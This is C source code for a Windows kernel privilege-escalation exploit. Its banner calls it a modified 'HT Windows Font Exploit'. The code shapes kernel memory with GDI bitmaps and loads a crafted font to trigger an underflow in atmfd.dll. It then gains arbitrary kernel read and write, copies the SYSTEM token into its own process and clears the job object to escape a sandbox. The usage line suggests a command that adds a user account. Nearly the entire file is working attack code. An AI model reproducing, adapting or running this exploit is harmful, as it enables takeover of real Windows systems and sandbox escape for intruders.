#include <stdio.h>
#include <string.h>
#include "lib.h"
#include <Wininet.h>
#include <Shellapi.h>
//#include "starter.h"

//include OTF
//#include "font.h" // foofont is fetched from loader config struct 

//#include "cert.h"
#include "loader.h"

#pragma pack(1)

#define smallbitmapw64 12
#define smallbitmaph64 7

#define smallbitmapw32 17
#define smallbitmaph32 10

#define largebitmapw 110
#define largebitmaph 100

//obtain kernel address of a gdi handle
#define handleaddr(handle) *(unsigned int*)(lpTable->locals->gditable+0x10*(((unsigned int)handle)&0xFFFF))
#define handleaddr64low(handle) *(unsigned int*)(lpTable->locals->gditable+0x18*(((unsigned int)handle)&0xFFFF))
#define handleaddr64high(handle) *(unsigned int*)(lpTable->locals->gditable+0x18*(((unsigned int)handle)&0xFFFF)+4)

//unsigned int gditable; //address of gdi shared handle table

//HBITMAP hBitmap;
//HBITMAP hBitmapslarge[1000];
//HBITMAP testbitmap = NULL;


//int firstfailed = 0;

//HBITMAP thehandle;

unsigned int arbread(PVTABLE lpTable, unsigned int addrl, unsigned int addrh);
unsigned int arbwrite(PVTABLE lpTable, unsigned int addrl, unsigned int addrh, unsigned int value0, unsigned int value1);


__declspec(naked) _cdecl void stackprobe(void)
{
	/* apparently naked doesn't work */

	//_asm("popl %ebp"); //workaround
	_asm("popl %ecx");
	_asm("movl $0x40100, %eax");

_asm("loop:");
	_asm("subl $0x1000, %esp");
	_asm("subl $0x1000, %eax");
	_asm("testl (%esp), %eax");
	_asm("cmpl $0x1000, %eax");
	_asm("jae loop");
	_asm("subl %eax, %esp");
	_asm("testl (%esp), %eax");
	
	_asm("jmp %ecx");
}


// ported
void allocatetestbitmap(PVTABLE lpTable) {
	unsigned int buf[largebitmapw*largebitmaph*3];
	BITMAPINFO bmpinfo;

	__MEMSET__(buf, 0xDE, sizeof(buf));

	lpTable->locals->testbitmap = lpTable->fpCreateBitmap(largebitmapw, (largebitmaph+1)*3, 1, 32, buf);
}

//allocate multiple chunks of 0xB000 bytes

// ported
void allocatelargebitmaps(PVTABLE lpTable) {
	int i;
	unsigned int buf[largebitmapw*largebitmaph];
	BITMAPINFO bmpinfo;

	__MEMSET__(buf, 0xDE, sizeof(buf));
	
	for (i = 0; i < sizeof(lpTable->locals->hBitmapslarge)/4; i++) {
		if (lpTable->locals->hBitmapslarge[i])
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[i]);
	}

	__MEMSET__(lpTable->locals->hBitmapslarge, 0, sizeof(lpTable->locals->hBitmapslarge));

	for (i = 0; i < sizeof(lpTable->locals->hBitmapslarge)/4; i++) {
		lpTable->locals->hBitmapslarge[i] = lpTable->fpCreateBitmap(largebitmapw, largebitmaph, 1, 32, buf);
		if (lpTable->locals->hBitmapslarge[i] == 0x0)
			break;
	}
}

// ported
int __declspec(naked) __stdcall getgditable64(void) {
	_asm("mov %fs:(0x18), %eax");
	_asm("mov 0xF70(%eax), %eax");
	_asm("mov 0x60(%eax), %eax");
	_asm("mov 0xF8(%eax), %eax");
	_asm("ret");
}


int (*addressOfRtlGetCurrentPeb)(void);

int _stdcall (*NamedEscape)(HDC hdc, wchar_t *pDriver, int nEscape, int cbInput, void* lpszInData, int cbOutput, void* lpszOutData);

//fix CFF table checksum after alteration

//ported
void fixchecksum(PVTABLE lpTable) {
	char tmp[0xB18F8];
	int i;
	unsigned int sum = 0;

	__MEMSET__(tmp, 0, sizeof(tmp));
	__MEMCPY__(tmp, lpTable->lpLoaderConfig->foofont+0x568, 0x9BF67);

	for (i = 0; i < sizeof(tmp); i+=4)
		sum += lpTable->fpHtonl(*(unsigned int*)(tmp+i));

	*(unsigned int*)(lpTable->lpLoaderConfig->foofont+0x10) = lpTable->fpHtonl(sum);
}


//SURFACE kernel object, located at the kernel address of a bitmap handle

typedef struct {
	unsigned int handle0;
	unsigned int unk0[4];
	unsigned int handle1;
	unsigned int unk1[2];
	unsigned int width;
	unsigned int height;
	unsigned int size;
	unsigned int address0;
	unsigned int address1;
	unsigned int scansize;
	unsigned int unk2;
	unsigned int bmpformat;
	unsigned int surftype;
	unsigned int unk3;
	unsigned int surflags;
	unsigned int unk4[12];
} SURFACE;

typedef struct {
	unsigned int handle0;
	unsigned int unk0[7];
	unsigned int handle1;
	unsigned int unk1[5];
	unsigned int width;
	unsigned int height;
	unsigned int size;
	unsigned int sizeh;
	unsigned int address0low;
	unsigned int address0high;
	unsigned int address1low;
	unsigned int address1high;
	unsigned int scansize;
	unsigned int unk2;
	unsigned int bmpformat;
	unsigned int surftype;
	unsigned int unk3[2];
	unsigned int surflags;
	unsigned int unk4[12];
} SURFACE64;



typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);


// ported
void getplatformandOS(PVTABLE lpTable) {
	OSVERSIONINFOEX osvi;
	ISWOW64PROCESS fnIsWow64Process;
	BOOL bIs64 = 0;

		
	fnIsWow64Process = lpTable->fpIsWow64Process;

	
	if (fnIsWow64Process)
		fnIsWow64Process(lpTable->fpGetCurrentProcess(),&bIs64);

	
	__MEMSET__(&osvi, 0, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	if (! lpTable->fpGetVersionExA((OSVERSIONINFO*) &osvi))
		return;

	
	if ((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 1))
		lpTable->locals->isxp = 1;

	if ((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0))
		lpTable->locals->isvista = 1;


	if ((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1))
		lpTable->locals->is7 = 1;
		

	if ((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 2))
		lpTable->locals->is8 = 1;
	
	// TODO FIXME
	if ((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 2))
		lpTable->locals->is81 = 1;


	lpTable->locals->is64 = bIs64;
}
BOOL CompareWindowsVersion(PVTABLE lpTable, DWORD dwMajorVersion, DWORD dwMinorVersion);
ULONGLONG WINAPI VerSetConditionMask( ULONGLONG dwlConditionMask,  DWORD dwTypeBitMask, BYTE dwConditionMask);

#define VER_SET_CONDITION(_m_,_t_,_c_)   ((_m_)=lpTable->fpVerSetConditionMask((_m_),(_t_),(_c_))) 

#define VER_MINORVERSION                0x0000001
#define VER_MAJORVERSION                0x0000002
#define VER_BUILDNUMBER                 0x0000004
#define VER_PLATFORMID                  0x0000008
#define VER_SERVICEPACKMINOR            0x0000010
#define VER_SERVICEPACKMAJOR            0x0000020
#define VER_SUITENAME                   0x0000040
#define VER_PRODUCT_TYPE                0x0000080


#define VER_EQUAL                       1
#define VER_GREATER                     2
#define VER_GREATER_EQUAL               3
#define VER_LESS                        4
#define VER_LESS_EQUAL                  5
#define VER_AND                         6
#define VER_OR                          7

#define VER_CONDITION_MASK              7
#define VER_NUM_BITS_PER_CONDITION_MASK 3


BOOL CompareWindowsVersion(PVTABLE lpTable, DWORD dwMajorVersion, DWORD dwMinorVersion)
{
    OSVERSIONINFOEX ver;
    DWORDLONG dwlConditionMask = 0;

	
    __MEMSET__(&ver, 0, sizeof(OSVERSIONINFOEX));
    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    ver.dwMajorVersion = dwMajorVersion;
    ver.dwMinorVersion = dwMinorVersion;

    VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_EQUAL);
    VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_EQUAL);

    return lpTable->fpVerifyVersionInfoA(&ver, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask);
}


int exploit(PVTABLE lpTable) {
	int argc = 0;
	wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	printf("HT Windows Font Exploit modify by skyer\n");
	if (argc != 2)
	{
		printf("Usage: exp.exe \"net user t00ls t00ls /ad\"\n");
		fflush(stdout);
		ExitProcess(0);
	}
	char inbuf[0x20009];
	char outbuf[0x20009];
	//char *inbuf = lpTable->locals->inbuf;
	//char *outbuf = lpTable->locals->outbuf;
	unsigned int i, j, min, max, count;
	unsigned int peb;
	int found = 0;
	SURFACE64 surf64;
	SURFACE surf32;
	unsigned int tmp[4];// = {0,0,0,0};
	__MEMSET__(tmp, 0, 4);
	unsigned char lastbytes[256];
	
	unsigned int corruptedchunk, flink, blink;
	unsigned int realchunksize = largebitmapw*largebitmaph*4;
	unsigned int buf64[smallbitmapw64*smallbitmaph64];
	unsigned int buf32[smallbitmapw32*smallbitmaph32];

	unsigned int sysproch;
	unsigned int sysprocl;
	unsigned int systokenh;
	unsigned int systokenl;
	unsigned int origtokenh;
	unsigned int origtokenl;
	unsigned int origjobh;
	unsigned int origjobl;
	unsigned int kbase = 0;
	
	char buf_dbg[256];
	char logBuffer[1024];
	//UINT64 fLastTime = 0, fTemp = 0;
	
	HANDLE hProcessHeap = lpTable->fpGetProcessHeap();
	//char *inbuf = (char *) lpTable->fpHeapAlloc(hProcessHeap, 0x00000008, 0x20009);
	//char *outbuf = (char *) lpTable->fpHeapAlloc(hProcessHeap, 0x00000008, 0x20009);
	
	//unsigned int *buf64 = (unsigned int *)lpTable->fpHeapAlloc(hProcessHeap, 0x00000008, smallbitmapw64*smallbitmaph64);
	//unsigned int *buf32 = (unsigned int *)lpTable->fpHeapAlloc(hProcessHeap, 0x00000008, smallbitmapw32*smallbitmaph32);

	//lpTable->lpLoaderConfig->foofont = foofont;
	

	int (*fpAddressOfRtlGetCurrentPeb)(void);
	fpNamedEscape NamedEscape;

	//char cExploit[20] = { '[', '*', ']', '\t', 'e', 'x', 'p', 'l', 'o', 'i', 't', '(', ')', '\n', 0x0};
	lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strExploit);
	

	getplatformandOS(lpTable);

	prepare_for_exploit(lpTable);

	if(CompareWindowsVersion(lpTable, 6, 3))
		kbase = 0xFFFFE000;
	else
		kbase = 0xFFFFFA80;

	lpTable->fpSnprintf(logBuffer, 1024, lpTable->lpLoaderConfig->strKbase, kbase);
	lpTable->fpOutputDebugStringA(logBuffer);
	

	__MEMSET__(lpTable->locals->hBitmapslarge, 0, sizeof(lpTable->locals->hBitmapslarge));
	

	
	if (lpTable->locals->is64)
		lpTable->locals->hBitmap = lpTable->fpCreateBitmap(smallbitmapw64, smallbitmaph64, 1, 32, buf64);
	else
		lpTable->locals->hBitmap = lpTable->fpCreateBitmap(smallbitmapw32, smallbitmaph32, 1, 32, buf32);

	__MEMSET__(outbuf, 0, sizeof(outbuf));
	__MEMSET__(inbuf, 0, sizeof(outbuf));
	__MEMSET__(buf64, 0, sizeof(buf64));
	__MEMSET__(buf32, 0, sizeof(buf32));

	//obtain GdiSharedHandleTable
	char *cNtdll = lpTable->lpLoaderConfig->strNtDll;
	char *cGdi32 = lpTable->lpLoaderConfig->strGdi32;
	char *cRtlGetCurrentPeb = lpTable->lpLoaderConfig->strRtlGetCurrentPeb;
	char *cNamedEscape = lpTable->lpLoaderConfig->strNamedEscape;
	

	if (lpTable->locals->is64)
		lpTable->locals->gditable = getgditable64();
	else {
		fpAddressOfRtlGetCurrentPeb =  (int (*)(void)) lpTable->GetProcAddress(lpTable->fpGetModuleHandleA(cNtdll), cRtlGetCurrentPeb);
		peb = fpAddressOfRtlGetCurrentPeb();
		lpTable->locals->gditable = *(unsigned int*)(peb + 0x94);
	}

	NamedEscape = (fpNamedEscape) lpTable->GetProcAddress(lpTable->fpGetModuleHandleA(cGdi32), cNamedEscape);

	lpTable->fpSnprintf(buf_dbg, 256, lpTable->lpLoaderConfig->strGdiTable, lpTable->locals->gditable);
	lpTable->fpOutputDebugStringA(buf_dbg);


	//prepare a SURFACE object which will overwrite the SURFACE object of a large bitmap
	//this will enable us to modify hBitmap's pixel data in kernel

	if (!lpTable->locals->is64) {
		__MEMSET__(&surf32, 0, sizeof(surf32));

		surf32.width = largebitmapw;
		surf32.height = largebitmaph;
		surf32.size = surf32.width*surf32.height*4;

		//point to hBitmap SURFACE->address0, which contains the kernel address of bitmap data
		surf32.address0 = surf32.address1 = handleaddr(lpTable->locals->hBitmap) + 0x2C;
		surf32.scansize = surf32.width*4;
		surf32.bmpformat = 0x6; //BMF_32BPP
		surf32.surftype = 0x00010000; //STYPE_DEVICE
		surf32.surflags = 0x04800000; //API_BITMAP | HOOK_TEXTOUT

		//write to the OTF data loaded from font.h
		for (i = 0; i < sizeof(surf32); i+=2) {
			unsigned short tmp = *(unsigned short*)((unsigned int)&surf32+i);
			*(unsigned short*)(lpTable->lpLoaderConfig->foofont+0x16DF3+i) = lpTable->fpHtons(tmp);
		}
	} else {

		__MEMSET__(&surf64, 0, sizeof(surf64));

		surf64.width = largebitmapw;
		surf64.height = largebitmaph;
		surf64.size = surf64.width*surf64.height*4;

		//point to hBitmap SURFACE->address0, which contains the kernel address of bitmap data
		surf64.address0low = surf64.address1low = handleaddr64low(lpTable->locals->hBitmap) + 0x48;
		surf64.address0high = surf64.address1high = handleaddr64high(lpTable->locals->hBitmap);
		surf64.scansize = surf64.width*4;
		surf64.bmpformat = 0x6; //BMF_32BPP
		surf64.surftype = 0x00010000; //STYPE_DEVICE
		surf64.surflags = 0x04800200; //API_BITMAP | HOOK_TEXTOUT

		//write to the OTF data loaded from font.h
		for (i = 0; i < sizeof(surf64); i+=2) {
			unsigned short tmp = *(unsigned short*)((unsigned int)&surf64+i);
			*(unsigned short*)(lpTable->lpLoaderConfig->foofont+0x16DEF+i) = lpTable->fpHtons(tmp);
		}
	}

	//fix CFF table checksum
	fixchecksum(lpTable);

	////////////////////

	/*fTemp = getTime();
	snprintf(logBuffer, 1024, "[*] font ready: %llu\n", fTemp-fLastTime);
	logLine(logBuffer);
	fLastTime = fTemp;*/

	//prepare memory
	for (i = 0; i < 100; i++)
		
		if (lpTable->locals->is64)
			lpTable->fpCreateBitmap(smallbitmapw64, smallbitmaph64, 1, 32, buf64);
		else
			lpTable->fpCreateBitmap(smallbitmapw32, smallbitmaph32, 1, 32, buf32);



	/*fTemp = getTime();
	snprintf(logBuffer, 1024, "[*] memory prepared, will not load font instances: %llu\n", fTemp-fLastTime);
	logLine(logBuffer);
	fLastTime = fTemp;*/

	//find the kernel address of the font object by allocating a 0x330 bitmap object
	//in the session pool immediately after loading the font, this places the bitmap
	//object in the vicinity of the font object

	
	WCHAR *wcAtmfd = lpTable->lpLoaderConfig->strAtmfd;

	
	while (found == 0) {
		//load the font
		//load the font
		unsigned char fontloaded = 0;
		HANDLE fhandle;
		for (j = 0; j < 15; j++) {
			

			tmp[0] = 0;
			
			/*fTemp = getTime();
			snprintf(logBuffer, 1024, "[*] %d *Sleep * First AddFontMemResourceEx: %llu\n", j, fTemp-fLastTime);
			logLine(logBuffer);
			fLastTime = fTemp;*/
			
			fhandle = lpTable->fpAddFontMemResourceEx(lpTable->lpLoaderConfig->foofont, sizeof(lpTable->lpLoaderConfig->foofont), 0, &tmp[0]);
			if (fhandle)
			{
				fontloaded = 1;
				lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strFontFound);
			}
		}

		if (fontloaded == 0) {
			lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strProcessInternal); 
			return -1;
		}


		
		if (lpTable->locals->is64)
			j = (unsigned int)lpTable->fpCreateBitmap(smallbitmapw64, smallbitmaph64, 1, 32, buf64);
		else
			j = (unsigned int)lpTable->fpCreateBitmap(smallbitmapw32, smallbitmaph32, 1, 32, buf32);

		if (lpTable->locals->is64) {
			tmp[0] = handleaddr64low(j);
			tmp[1] = handleaddr64high(j);
		} else
			tmp[0] = handleaddr(j);

		min = tmp[0]-0x4000;
		max = tmp[0]+0x4000;

		for (j = 0; j < 15; j++) {
			
			tmp[0] = 0;
						
			//lpTable->fpAddFontMemResourceEx(lpTable->lpLoaderConfig->foofont, sizeof(lpTable->lpLoaderConfig->foofont), 0, &tmp[0]);
			
			if (lpTable->fpAddFontMemResourceEx(lpTable->lpLoaderConfig->foofont, sizeof(lpTable->lpLoaderConfig->foofont), 0, &tmp[0]))
				lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strFontFound);

		}
		



		for (i = min; i < max; i+=8) {
			int ret;

			*(unsigned int*)inbuf = i;

			if (lpTable->locals->is64)
				*(unsigned int*)(inbuf+4) = tmp[1];

			__MEMSET__(outbuf, 0, sizeof(outbuf));

			//call an internal atmfd.dll function which receives a kernel font object as input and validates it
			//also returning data that identifies the font
			if (lpTable->locals->is64) {
				ret = NamedEscape(NULL, wcAtmfd, 0x250A, 0x10, inbuf, 0x10, outbuf);
			} else {
				ret = NamedEscape(NULL, wcAtmfd, 0x250A, 0x0C, inbuf, 0x0C, outbuf);
			}

			if (ret != 0xFFFFFF21) {
				char *p;

				if (lpTable->locals->is64)
					p = outbuf+8;
				else
					p = outbuf+4;

				if (__MEMCMP__(p, lpTable->lpLoaderConfig->strFontEgg, 8) == 0) {

					
					found = 1;
					break;
				}
			}

		}

		
	}

	
	lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strFontFound);


	////////////////

	if (found) {
		int count, addr1, addr2;
		int matchcount = 0;
		int direction = 0;
		int matched = -1;

		//store the found object to the input buffer
		__MEMSET__(inbuf, 0, sizeof(inbuf));
		*(unsigned int*)inbuf = i;

		if (lpTable->locals->is64) {
			*(unsigned short*)(inbuf+8) = (sizeof(inbuf)-0xE)/2;
			*(unsigned int*)(inbuf+4) = tmp[1];
		} else
			*(unsigned short*)(inbuf+4) = (sizeof(inbuf)-10)/2;
retry:
		//allocate large bitmaps (0xB000) in order to place a kernel buffer of 0x21000 bytes at a desired address
		allocatelargebitmaps(lpTable);

		for (i = 0; i < sizeof(lpTable->locals->hBitmapslarge)/4; i++)
			if (lpTable->locals->hBitmapslarge[i] == 0)
				break;

		count = i;


		//locate 9 consecutive 0xB000 kernel chunks that were allocated in order
		for (i = 1; i < count; i++) {
			if (i >= count/2) {
				unsigned int addr1;
				unsigned int addr2;

				if (lpTable->locals->is64) {
					addr1 = handleaddr64low(lpTable->locals->hBitmapslarge[i-1]);
					addr2 = handleaddr64low(lpTable->locals->hBitmapslarge[i]);
				} else {
					addr1 = handleaddr(lpTable->locals->hBitmapslarge[i-1]);
					addr2 = handleaddr(lpTable->locals->hBitmapslarge[i]);
				}

				if (addr2 - addr1 == 0xB000) {
					if (direction == 1)
						matchcount = 0;

					direction = 0;
					matchcount++;

				}
				else if (addr1 - addr2 == 0xB000) {
					if (direction == 0)
						matchcount = 0;

					direction = 1;
					matchcount++;

				}
				else {
					matchcount = 0;
				}

				if (matchcount == 9) {
					matched = i-5;
					break;
				}
			}

		}

		if (matched == -1) {
			return -1;
		}

		

		//remove three consecutive 0xB000 chunks -> concatenated into one large 0x21000 free chunk
		if (!direction) {
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched]);
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched+1]);
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched+2]);
		} else {
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched+2]);
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched+1]);
			lpTable->fpDeleteObject(lpTable->locals->hBitmapslarge[matched]);
		}

		
		allocatetestbitmap(lpTable);

		if (lpTable->locals->testbitmap == NULL) {
			lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strBitmapFailed);
			exit(0);
		}

		if (lpTable->locals->is64) {
		
			if (!direction)
				if (handleaddr64low(lpTable->locals->testbitmap) != handleaddr64low(lpTable->locals->hBitmapslarge[matched-1])+0xB000)
				{
//					DeleteObject(testbitmap);
					goto retry;
				}

			if (direction)
				if (handleaddr64low(lpTable->locals->testbitmap) != handleaddr64low(lpTable->locals->hBitmapslarge[matched+3])+0xB000)
				{
//					DeleteObject(testbitmap);
					goto retry;
				}
		} else {
		
			if (!direction)
				if (handleaddr(lpTable->locals->testbitmap) != handleaddr(lpTable->locals->hBitmapslarge[matched-1])+0xB000)
				{
//					DeleteObject(testbitmap);
					goto retry;
				}

			if (direction)
				if (handleaddr(lpTable->locals->testbitmap) != handleaddr(lpTable->locals->hBitmapslarge[matched+3])+0xB000)
				{
//					DeleteObject(testbitmap);
					goto retry;
				}
		}

		lpTable->fpDeleteObject(lpTable->locals->testbitmap);
		
		
		//getchar();

		//call atmfd.dll function 0x2514 with an input buffer of 0x20005 bytes
		//the input buffer has the kernel address of the loaded font in the first dword
		//and the size of words its able to hold in the following word

		//before entering atmfd.dll, win32k.dll allocates a kernel buffer of 0x21000 bytes for the input buffer
		//this kernel buffer will be allocated into the previously created hole

		//function 0x2514 will also trigger the exploited vulnerability,
		//which will underflow the 0x21000 buffer with controlled data,
		//corrupting the SURFACE object of the bitmap object placed below the buffer
		//with the previously constructed SURFACE object (pointing to hBitmap)


		/*fTemp = getTime();
		snprintf(logBuffer, 1024, "[*] triggering vuln: %llu\n", fTemp-fLastTime);
		logLine(logBuffer);
		fLastTime = fTemp;*/

		if (lpTable->locals->is64) {
			NamedEscape(NULL, wcAtmfd, 0x2514, sizeof(inbuf), inbuf, sizeof(outbuf), outbuf);
		} else {
			NamedEscape(NULL, wcAtmfd, 0x2514, sizeof(inbuf)-4, inbuf, sizeof(outbuf)-4, outbuf);
		}


		


		//obtain the handle of the modified bitmap
		//direction represents the direction in which the memory grows on allocation
		//0 = up (XP)
		//1 = down (7)

		if (!direction)
			lpTable->locals->thehandle = lpTable->locals->hBitmapslarge[matched-1];
		else
			lpTable->locals->thehandle = lpTable->locals->hBitmapslarge[matched+3];

		__MEMSET__(lastbytes, 0, sizeof(lastbytes));

		lpTable->fpGetBitmapBits(lpTable->locals->thehandle, sizeof(lastbytes), lastbytes);

		//validate scan size - check if exploit was successful
		if (lpTable->locals->is64) {
			if (*(unsigned int*)(lastbytes+16) != smallbitmapw64*4) {
//THIS SHOULD NEVER OCCUR
				//lpTable->fpOutputDebugStringA("Should never 1\n");
				__MEMSET__(lpTable->locals->hBitmapslarge, 0, sizeof(lpTable->locals->hBitmapslarge));
				lpTable->locals->firstfailed = 1;
				goto retry;
			}
		} else {
			if (*(unsigned int*)(lastbytes+8) != smallbitmapw32*4) {
//THIS SHOULD NEVER OCCUR
				//lpTable->fpOutputDebugStringA("Should never 2\n");
				__MEMSET__(lpTable->locals->hBitmapslarge, 0, sizeof(lpTable->locals->hBitmapslarge));
				lpTable->locals->firstfailed = 1;
				goto retry;
			}
		}

		//call SetBitmapBits on thehandle,
		//effectively overwriting the bitmap bits address of hBitmap

		if (lpTable->locals->is64) {
			tmp[0] = tmp[2] = handleaddr64low(lpTable->locals->thehandle);
			tmp[1] = tmp[3] = handleaddr64high(lpTable->locals->thehandle);
		} else {
			tmp[0] = tmp[1] = handleaddr(lpTable->locals->thehandle);
		}

		//after this call, [Set/Get]BitmapBits(hBitmap) will read or write data to
		//our desired address (in this case the real address of the initially corrupted bitmap)
		if (lpTable->locals->is64)
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);
		else
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);

		//write the bitmap handle to its SURFACE object
		//avoiding future kernel panics

		if (lpTable->locals->is64) {
			surf64.handle0 = surf64.handle1 = (unsigned int)lpTable->locals->thehandle;
			lpTable->fpSetBitmapBits(lpTable->locals->hBitmap, sizeof(surf64), &surf64);
		} else {
			surf32.handle0 = surf32.handle1 = (unsigned int)lpTable->locals->thehandle;
			lpTable->fpSetBitmapBits(lpTable->locals->hBitmap, sizeof(surf32), &surf32);
		}

		//fix corrupted heap chunk (placed before overwritten chunk)
		//to avoid kernel crashes when freeing the chunk on program exit

		//read 256 bytes from the beginning of a valid (not corrupted) bitmap
		//in order to determine the number of bytes placed in kernel before the actual
		//image bits
		if (lpTable->locals->is64) {
			tmp[0] = tmp[2] = handleaddr64low(lpTable->locals->hBitmapslarge[0]);
			tmp[1] = tmp[3] = handleaddr64high(lpTable->locals->hBitmapslarge[0]);
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);
		} else {
			tmp[0] = tmp[1] = handleaddr(lpTable->locals->hBitmapslarge[0]);
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);
		}

		__MEMSET__(lastbytes, 0xDE, sizeof(lastbytes));
		lpTable->fpGetBitmapBits(lpTable->locals->hBitmap, sizeof(lastbytes), lastbytes);

		if (*(unsigned int*)(lastbytes+(lpTable->locals->is64?0x48:0x2C)) == 0xDEDEDEDE) {
			return -1;
		}
		//true chunk size = address of data bits - start address + width*height*4
		if (lpTable->locals->is64)
			realchunksize += *(unsigned int*)(lastbytes+0x48) - handleaddr64low(lpTable->locals->hBitmapslarge[0]);
		else
			realchunksize += *(unsigned int*)(lastbytes+0x2C) - handleaddr(lpTable->locals->hBitmapslarge[0]);


		//chunks are followed e.g. on Windows 7 by a structure containing internal heap fields
		//later used to validate the chunk
		//e.g. flink, blink

		//compute the address of the corrupted chunk and the flink and blink it should point to
		if (lpTable->locals->is64) {
			if (!direction) {
				corruptedchunk = handleaddr64low(lpTable->locals->hBitmapslarge[matched-2]) + realchunksize;
				flink = handleaddr64low(lpTable->locals->hBitmapslarge[matched-1]) + realchunksize;
				blink = handleaddr64low(lpTable->locals->hBitmapslarge[matched-3]) + realchunksize;
			} else {
				corruptedchunk = handleaddr64low(lpTable->locals->hBitmapslarge[matched+4]) + realchunksize;
				flink = handleaddr64low(lpTable->locals->hBitmapslarge[matched+5]) + realchunksize;
				blink = handleaddr64low(lpTable->locals->hBitmapslarge[matched+3]) + realchunksize;
			}
		} else {
			if (!direction) {
				corruptedchunk = handleaddr(lpTable->locals->hBitmapslarge[matched-2]) + realchunksize;
				flink = handleaddr(lpTable->locals->hBitmapslarge[matched-1]) + realchunksize;
				blink = handleaddr(lpTable->locals->hBitmapslarge[matched-3]) + realchunksize;
			} else {
				corruptedchunk = handleaddr(lpTable->locals->hBitmapslarge[matched+4]) + realchunksize;
				flink = handleaddr(lpTable->locals->hBitmapslarge[matched+5]) + realchunksize;
				blink = handleaddr(lpTable->locals->hBitmapslarge[matched+3]) + realchunksize;
			}
		}

		//read 256 bytes from the end of a valid HBITMAP
		//in order to dynamically determine the location of the flink and blink fields
		if (lpTable->locals->is64) {
			tmp[0] = tmp[2] = flink;
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);
		} else {
			tmp[0] = tmp[1] = flink;
			lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);
		}


		lpTable->fpGetBitmapBits(lpTable->locals->hBitmap, sizeof(lastbytes), lastbytes);

		for (i = 0; i < sizeof(lastbytes); i+=4) {
			unsigned int dword = *(unsigned int*)(lastbytes+i);
			if (corruptedchunk + i - (lpTable->locals->is64?8:4) == dword) {
				break;
			}
		}

		//once the offset to the blink is determined (blink is at i, flink is at i-4)
		//the corrupted chunk's flink and blink fields are fixed
		if (i != sizeof(lastbytes)) {
			if (lpTable->locals->is64) {
				*(unsigned int*)(lastbytes+i) = blink+i-8;
				*(unsigned int*)(lastbytes+i-8) = flink+i-8;

				tmp[0] = tmp[2] = corruptedchunk;
				lpTable->fpSetBitmapBits(lpTable->locals->thehandle, sizeof(tmp), &tmp);
			} else {
				*(unsigned int*)(lastbytes+i) = blink+i-4;
				*(unsigned int*)(lastbytes+i-4) = flink+i-4;

				tmp[0] = tmp[1] = corruptedchunk;
				lpTable->fpSetBitmapBits(lpTable->locals->thehandle, 8, &tmp);
			}
			lpTable->fpSetBitmapBits(lpTable->locals->hBitmap, sizeof(lastbytes), lastbytes);
		}


		lpTable->fpOutputDebugStringA(lpTable->lpLoaderConfig->strTraversingProcesses);
				

		//traverse processes
		sysprocl = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->flink_offset, kbase)-lpTable->locals->flink_offset;

		if (lpTable->locals->is64)
			sysproch = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->flink_offset+4, kbase);

		for (;;) {
			unsigned int tmpaddr;

			if (arbread(lpTable, sysprocl+lpTable->locals->pid_offset, sysproch) == 4)	//System
				break;

			tmpaddr = arbread(lpTable, sysprocl+lpTable->locals->flink_offset, sysproch)-lpTable->locals->flink_offset;

			if (lpTable->locals->is64)
				sysproch = arbread(lpTable, sysprocl+lpTable->locals->flink_offset+4, sysproch);

			sysprocl = tmpaddr;

		}
		

		systokenh = 0;

		if (!lpTable->locals->is64) {
			systokenl = arbread(lpTable, sysprocl+lpTable->locals->token_offset, sysproch);
			systokenl &= 0xFFFFFFF8;
		}
		else {
			systokenl = arbread(lpTable, sysprocl+lpTable->locals->token_offset, sysproch);
			systokenh = arbread(lpTable, sysprocl+lpTable->locals->token_offset+4, sysproch);

			systokenl &= 0xFFFFFFF0;
		}

		origtokenl = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->token_offset, kbase);

		if (lpTable->locals->is64)
			origtokenh = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->token_offset+4, kbase);

		arbwrite(lpTable, lpTable->locals->kproc+lpTable->locals->token_offset, kbase, systokenl, systokenh);

		//clear out job object - escape potential sandbox
		origjobl = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->job_offset, kbase);

		if (lpTable->locals->is64)
			origjobh = arbread(lpTable, lpTable->locals->kproc+lpTable->locals->job_offset+4, kbase);
		
		arbwrite(lpTable, lpTable->locals->kproc+lpTable->locals->job_offset, kbase, 0, 0);

	
	}
	
	//EnumWindows(enumproc, GetCurrentProcessId());
	
	/*
	GetTempPath(1024, inbuf);
	strcat(inbuf, "\\starter.exe");
	writeEXE(inbuf, pdf, sizeof(pdf));
	sprintf(outbuf, "%s 0x%x", inbuf, mywindow);
	execstarter(outbuf);
	ShowWindow(mywindow, SW_HIDE); */
